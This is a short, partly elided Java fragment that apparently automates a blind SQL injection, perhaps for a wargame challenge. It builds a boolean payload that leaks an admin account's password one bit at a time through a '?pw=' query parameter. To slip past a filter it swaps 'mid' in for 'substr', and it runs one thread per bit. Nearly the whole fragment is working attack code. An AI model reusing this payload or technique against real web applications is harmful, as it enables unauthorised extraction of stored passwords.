...
String content;
	...
	public void run(){
		...
		try{
			final int bin_len = 8;
			final String fntans = String.format( "' || ( id like 'admin' && strcmp(substr(pw,%%d,1),' ')<>0 && substr(lpad(bin(ascii(substr(pw,%%d,1))),%d,'0'),%%d,1) like '1' ) #".replaceAll("substr","mid"),bin_len);
			...
			//for(int i=1;i<=strlen;i++){
				final char[] bins=new char[bin_len];
				...
				for(int k =1;k<=bin_len;k++){
					...
					ths[k-1]=new Thread(new Runnable(){
						...
						public void run(){
							try{
					String sub_query = "?pw="+URLEncoder.encode( String.format(fntans,i,i,j));
